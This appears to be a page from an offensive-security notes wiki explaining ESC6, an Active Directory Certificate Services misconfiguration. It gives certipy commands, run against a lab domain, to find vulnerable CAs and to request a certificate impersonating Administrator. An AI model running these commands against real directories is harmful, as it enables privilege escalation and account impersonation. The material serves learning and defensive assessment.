---
description: ESC | Active Directory Certificate Services
---

# ESC6

The Certificate Authority can be vulnerable if a specific flag, `EDITF_ATTRIBUTESUBJECTALTNAME2`. This was patched in May 2022. A security concern in how **Smart Card Logon** is implemented in on-premise Active Directory environments that revolves around the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag in Certificate Authorities (CA).&#x20;

If this flag is enabled, it allows users to define custom values in the **Subject Alternative Name (SAN)** field of a certificate. This means:

* Even low-privileged users can request a certificate (e.g., via the default "User" template) with **Client Authentication** EKU (1.3.6.1.5.5.7.3.2).
* The certificate can include a custom **User Principal Name (UPN)**, allowing an attacker to impersonate any user, including privileged accounts.

This misconfiguration can lead to privilege escalation.

```bash
# Enumeration
certipy find -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout

# Result
    [!] Vulnerabilities
      ESC6                              : Enrollees can specify SAN and Request Disposition is set to Issue. Does not work after May 2022
```

#### Abuse from Linux

```bash
# Request certificate with alternate UPN
certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template User -upn Administrator@lab.local
```

